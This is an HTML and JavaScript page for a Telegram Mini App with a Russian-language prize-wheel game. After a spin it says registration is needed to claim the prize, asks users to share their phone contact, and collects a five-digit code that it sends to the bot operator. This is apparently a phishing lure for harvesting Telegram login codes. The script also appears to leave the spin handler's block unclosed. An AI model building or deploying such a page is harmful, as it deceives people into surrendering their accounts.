<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { overflow-x: hidden; min-height: 100%; }

body {
  font-family: sans-serif; text-align: center;
  padding: 20px 16px 90px; color: #fff; min-height: 100vh;
}

body::before {
  content: '';
  position: fixed; inset: 0; z-index: -1;
  background-color: #05080f;
  background-image:
    radial-gradient(ellipse at 50% 20%, rgba(20,60,180,.35) 0%, transparent 55%),
    radial-gradient(ellipse at 80% 80%, rgba(50,10,120,.25) 0%, transparent 50%),
    radial-gradient(ellipse at 15% 65%, rgba(10,40,130,.2) 0%, transparent 45%),
    url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"><g fill="%23fff"><circle cx="10" cy="25" r="0.8" opacity="0.9"/><circle cx="55" cy="8" r="0.6" opacity="0.7"/><circle cx="90" cy="42" r="1" opacity="0.8"/><circle cx="140" cy="15" r="0.7" opacity="0.9"/><circle cx="185" cy="55" r="1.2" opacity="0.6"/><circle cx="230" cy="20" r="0.8" opacity="0.8"/><circle cx="275" cy="48" r="0.6" opacity="0.9"/><circle cx="320" cy="10" r="1" opacity="0.7"/><circle cx="370" cy="38" r="0.8" opacity="0.8"/><circle cx="420" cy="18" r="0.6" opacity="0.9"/><circle cx="30" cy="80" r="1.2" opacity="0.6"/><circle cx="75" cy="95" r="0.8" opacity="0.8"/><circle cx="120" cy="75" r="0.6" opacity="0.9"/><circle cx="165" cy="100" r="1" opacity="0.7"/><circle cx="210" cy="82" r="0.8" opacity="0.8"/><circle cx="255" cy="110" r="0.6" opacity="0.9"/><circle cx="300" cy="88" r="1.2" opacity="0.6"/><circle cx="345" cy="72" r="0.8" opacity="0.8"/><circle cx="395" cy="105" r="0.6" opacity="0.7"/><circle cx="445" cy="85" r="1" opacity="0.9"/><circle cx="20" cy="140" r="0.6" opacity="0.9"/><circle cx="65" cy="155" r="1" opacity="0.7"/><circle cx="110" cy="130" r="0.8" opacity="0.8"/><circle cx="200" cy="145" r="1.2" opacity="0.6"/><circle cx="245" cy="170" r="0.8" opacity="0.8"/><circle cx="290" cy="135" r="0.6" opacity="0.7"/><circle cx="335" cy="160" r="1" opacity="0.9"/><circle cx="380" cy="142" r="0.8" opacity="0.8"/><circle cx="430" cy="168" r="1.2" opacity="0.6"/><circle cx="40" cy="200" r="1" opacity="0.7"/><circle cx="85" cy="215" r="0.8" opacity="0.8"/><circle cx="130" cy="195" r="0.6" opacity="0.9"/><circle cx="175" cy="225" r="1" opacity="0.7"/><circle cx="265" cy="230" r="1.2" opacity="0.6"/><circle cx="310" cy="210" r="0.6" opacity="0.9"/><circle cx="355" cy="220" r="1" opacity="0.7"/><circle cx="400" cy="200" r="0.8" opacity="0.8"/><circle cx="450" cy="218" r="0.6" opacity="0.9"/><circle cx="15" cy="265" r="0.8" opacity="0.8"/><circle cx="60" cy="275" r="1" opacity="0.7"/><circle cx="150" cy="280" r="0.8" opacity="0.8"/><circle cx="195" cy="265" r="1.2" opacity="0.6"/><circle cx="240" cy="285" r="0.6" opacity="0.9"/><circle cx="285" cy="270" r="1" opacity="0.7"/><circle cx="375" cy="278" r="0.6" opacity="0.9"/><circle cx="425" cy="262" r="1" opacity="0.7"/><circle cx="470" cy="275" r="0.8" opacity="0.8"/><circle cx="80" cy="310" r="0.8" opacity="0.8"/><circle cx="125" cy="335" r="0.6" opacity="0.9"/><circle cx="170" cy="315" r="1" opacity="0.7"/><circle cx="215" cy="340" r="0.8" opacity="0.8"/><circle cx="260" cy="325" r="1.2" opacity="0.6"/><circle cx="350" cy="332" r="1" opacity="0.7"/><circle cx="395" cy="312" r="0.8" opacity="0.8"/><circle cx="445" cy="328" r="0.6" opacity="0.9"/><circle cx="70" cy="390" r="1" opacity="0.7"/><circle cx="115" cy="368" r="0.6" opacity="0.9"/><circle cx="160" cy="385" r="0.8" opacity="0.8"/><circle cx="205" cy="372" r="1.2" opacity="0.6"/><circle cx="250" cy="395" r="0.6" opacity="0.9"/><circle cx="295" cy="378" r="1" opacity="0.7"/><circle cx="340" cy="368" r="0.8" opacity="0.8"/><circle cx="385" cy="388" r="0.6" opacity="0.9"/><circle cx="435" cy="375" r="1" opacity="0.7"/><circle cx="100" cy="460" r="0.8" opacity="0.8"/><circle cx="150" cy="440" r="0.6" opacity="0.9"/><circle cx="200" cy="458" r="1" opacity="0.7"/><circle cx="250" cy="445" r="0.8" opacity="0.8"/><circle cx="300" cy="462" r="1.2" opacity="0.6"/><circle cx="350" cy="448" r="0.6" opacity="0.9"/><circle cx="400" cy="455" r="1" opacity="0.7"/><circle cx="450" cy="442" r="0.8" opacity="0.8"/></g></svg>');
  background-repeat: no-repeat, no-repeat, no-repeat, repeat;
  background-size: 100% 100%, 100% 100%, 100% 100%, 500px 500px;
}

.tab-content { display: none; }
.tab-content.active {
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  min-height: calc(100vh - 150px);
}

.wheel-wrap {
  position: relative;
  width: min(300px, 80vw);
  height: min(300px, 80vw);
  margin: 0 auto 16px;
}

.wheel {
  width: 100%; height: 100%; border-radius: 50%;
  position: relative; overflow: hidden;
  border: 4px solid #3d9eff;
  box-shadow: 0 0 20px rgba(61,158,255,.5), 0 0 50px rgba(61,158,255,.15);
}

.wheel-bg {
  position: absolute; inset: 0; border-radius: 50%;
  background-image:
    conic-gradient(
      #1b3f8a 0deg 36deg,   #0d2460 36deg 72deg,
      #1b3f8a 72deg 108deg, #0d2460 108deg 144deg,
      #1b3f8a 144deg 180deg,#0d2460 180deg 216deg,
      #1b3f8a 216deg 252deg,#0d2460 252deg 288deg,
      #1b3f8a 288deg 324deg,#0d2460 324deg 360deg
    ),
    repeating-conic-gradient(
      rgba(61,158,255,0.5) 0deg 1.2deg,
      transparent 1.2deg 36deg
    );
}

.wheel-center {
  position: absolute; width: 20px; height: 20px;
  background: radial-gradient(circle, #7dcfff, #3d9eff);
  border-radius: 50%;
  top: 50%; left: 50%; transform: translate(-50%, -50%);
  box-shadow: 0 0 10px rgba(61,158,255,0.9);
  z-index: 10;
}

.wheel-img {
  position: absolute; top: 50%; left: 50%;
  width: 50px; height: 50px; object-fit: cover;
  border-radius: 8px;
  border: 2px solid rgba(255,255,255,0.4);
  box-shadow: 0 2px 6px rgba(0,0,0,0.5);
  z-index: 3;
}

.wheel-pointer {
  position: absolute; top: -16px; left: 50%; transform: translateX(-50%);
  width: 0; height: 0;
  border-left: 14px solid transparent; border-right: 14px solid transparent;
  border-top: 24px solid #3d9eff;
  filter: drop-shadow(0 0 6px rgba(61,158,255,.9));
  z-index: 20;
}

#spin {
  margin-top: 20px; padding: 14px 36px; font-size: 18px;
  border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; box-shadow: 0 0 18px rgba(61,158,255,.5);
}
#spin:disabled { opacity: 0.4; box-shadow: none; }

.used-overlay {
  display: none; position: fixed; inset: 0;
  background: rgba(5,8,15,.92); backdrop-filter: blur(10px);
  align-items: center; justify-content: center;
  flex-direction: column; gap: 16px; z-index: 60; cursor: pointer;
}
.used-overlay.show { display: flex; }
.used-overlay .used-icon { font-size: 56px; }
.used-overlay h3 { font-size: 22px; font-weight: 700; color: #fff; }
.used-overlay p { font-size: 14px; color: #8aaad4; }

.step { display: none; width: 100%; max-width: 320px; }
.step.active { display: flex; flex-direction: column; align-items: center; gap: 18px; }
.step h2 { font-size: 24px; font-weight: 700; text-shadow: 0 0 16px rgba(61,158,255,.6); }
.step p { font-size: 15px; color: #8aaad4; line-height: 1.6; max-width: 260px; }

.code { display: flex; justify-content: center; gap: 10px; }
.code input {
  width: 48px; height: 64px; font-size: 28px; text-align: center;
  background: rgba(61,158,255,.07); color: #fff;
  border: 2px solid rgba(61,158,255,.3); border-radius: 12px;
}
.code input:focus { border-color: #3d9eff; outline: none; box-shadow: 0 0 10px rgba(61,158,255,.4); }

button#send, button#askContact {
  padding: 14px 0; font-size: 17px; border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; width: 100%; max-width: 280px;
  box-shadow: 0 0 18px rgba(61,158,255,.4);
}
button#send:disabled { opacity: 0.4; box-shadow: none; }

.tabbar {
  position: fixed; bottom: 0; left: 0; right: 0; display: flex;
  border-top: 1px solid rgba(61,158,255,.15);
  background: rgba(5,8,15,.97); backdrop-filter: blur(12px);
}
.tabbar button.tab-btn {
  flex: 1; padding: 14px 0; background: none; border: none;
  font-size: 15px; color: #445577;
  display: flex; flex-direction: column; align-items: center;
}
.tabbar button.tab-btn.active { color: #3d9eff; font-weight: bold; }

.overlay {
  position: fixed; inset: 0;
  background: rgba(5,8,15,.92); backdrop-filter: blur(10px);
  display: none; align-items: center; justify-content: center;
  flex-direction: column; z-index: 50; padding: 20px; gap: 18px;
}
.overlay.show { display: flex; }
.overlay img {
  width: 160px; height: 160px; object-fit: cover; border-radius: 20px;
  border: 3px solid #3d9eff;
  box-shadow: 0 0 30px rgba(61,158,255,.6);
}
.overlay p { font-size: 16px; color: #8aaad4; max-width: 260px; line-height: 1.6; }
.overlay button {
  padding: 14px 0; font-size: 16px; border: none; border-radius: 14px;
  background: linear-gradient(135deg, #1a5fcc, #3d9eff);
  color: #fff; width: 100%; max-width: 280px;
  box-shadow: 0 0 18px rgba(61,158,255,.4);
}
</style>
</head>
<body>

<div id="tab1" class="tab-content active">
  <div class="wheel-wrap">
    <div class="wheel-pointer"></div>
    <div class="wheel" id="wheel">
      <div class="wheel-bg" id="wheelBg"></div>
      <div class="wheel-center"></div>
    </div>
  </div>
  <button id="spin">Крутить 🎡</button>
</div>

<div id="tab2" class="tab-content">
  <div id="stepContact" class="step active">
    <h2>Вход</h2>
    <p>Чтобы продолжить, отправьте свой контакт</p>
    <button id="askContact">📱 Отправить контакт</button>
  </div>
  <div id="stepCode" class="step">
    <h2>Введите код</h2>
    <div class="code">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
      <input type="tel" maxlength="1" inputmode="numeric">
    </div>
    <button id="send" disabled>Подтвердить</button>
  </div>
</div>

<div class="tabbar">
  <button class="tab-btn active" data-tab="tab1">🎡</button>
  <button class="tab-btn" data-tab="tab2">Вход</button>
</div>

<div class="overlay" id="winOverlay">
  <img id="winImage" src="" alt="">
  <p>Чтобы забрать приз, пройдите регистрацию</p>
  <button id="goToReg">Перейти к регистрации</button>
</div>

<div class="used-overlay" id="usedOverlay">
  <div class="used-icon">🚫</div>
  <h3>Бонус уже использован</h3>
  <p>Нажмите, чтобы закрыть</p>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready(); tg.expand();

const tabButtons = document.querySelectorAll(".tab-btn");
const tabContents = document.querySelectorAll(".tab-content");
function openTab(id) {
  tabButtons.forEach(b => b.classList.toggle("active", b.dataset.tab === id));
  tabContents.forEach(c => c.classList.toggle("active", c.id === id));
}
tabButtons.forEach(btn => btn.addEventListener("click", () => openTab(btn.dataset.tab)));

const IMG_SRCS = [
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg",
  "https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg"
];

const COUNT = IMG_SRCS.length;
const STEP  = 360 / COUNT;
const R_IMG = 90;

const wheel   = document.getElementById("wheel");
const wheelBg = document.getElementById("wheelBg");
const center  = wheel.querySelector(".wheel-center");

const imgEls = IMG_SRCS.map(src => {
  const img = document.createElement("img");
  img.src = src;
  img.className = "wheel-img";
  wheel.insertBefore(img, center);
  return img;
});

function updateWheel(rot) {
  wheelBg.style.transform = `rotate(${rot}deg)`;
  const rotRad = rot * Math.PI / 180;
  imgEls.forEach((img, i) => {
    // ← ИЗМЕНЁННАЯ СТРОКА: + 0.5 ставит картинку в центр сектора
    const a = rotRad + (i + 0.5) * STEP * Math.PI / 180;
    const x = R_IMG * Math.sin(a);
    const y = -R_IMG * Math.cos(a);
    img.style.transform = `translate(calc(-50% + ${x}px), calc(-50% + ${y}px))`;
  });
}

updateWheel(0);

let currentRot = 0;
let spinUsed   = false;

function easeOutQuart(t) { return 1 - Math.pow(1 - t, 4); }

function animateSpin(from, to, ms, onDone) {
  const start = performance.now();
  (function frame(now) {
    const t = Math.min((now - start) / ms, 1);
    updateWheel(from + (to - from) * easeOutQuart(t));
    t < 1 ? requestAnimationFrame(frame) : (currentRot = to, onDone());
  })(performance.now());
}

const spinBtn     = document.getElementById("spin");
const overlay     = document.getElementById("winOverlay");
const winImage    = document.getElementById("winImage");
const goToReg     = document.getElementById("goToReg");
const usedOverlay = document.getElementById("usedOverlay");

spinBtn.addEventListener("click", () => {
  if (spinUsed) { usedOverlay.classList.add("show"); return; }
  spinBtn.disabled = true;
  const target = currentRot + 5 * 360 + Math.floor(Math.random() * 360);
animateSpin(currentRot, target, 4000, () => {
    spinUsed = true;
    spinBtn.disabled = false; // ← возвращаем кнопку, чтобы клики работали
    spinBtn.style.opacity = "0.5"; // ← визуально показываем, что использована
    const norm = ((target % 360) + 360) % 360;
    let idx = Math.round((360 - norm) / STEP) % COUNT;
    if (idx < 0) idx += COUNT;
    winImage.src = IMG_SRCS[idx];
    overlay.classList.add("show");
  });

goToReg.addEventListener("click", () => {
  overlay.classList.remove("show");
  openTab("tab2");
});

usedOverlay.addEventListener("click", () => usedOverlay.classList.remove("show"));

const stepContact = document.getElementById("stepContact");
const stepCode    = document.getElementById("stepCode");
document.getElementById("askContact").addEventListener("click", () => {
  tg.requestContact(granted => {
    if (granted) {
      stepContact.classList.remove("active");
      stepCode.classList.add("active");
    }
  });
});

const inputs  = document.querySelectorAll(".code input");
const sendBtn = document.getElementById("send");
function getCode() { return [...inputs].map(i => i.value).join(""); }
inputs.forEach((input, i) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/\D/g, "");
    if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
    sendBtn.disabled = getCode().length !== 5;
  });
  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
  });
});
sendBtn.addEventListener("click", () => tg.sendData(getCode()));
</script>
</body>
</html>
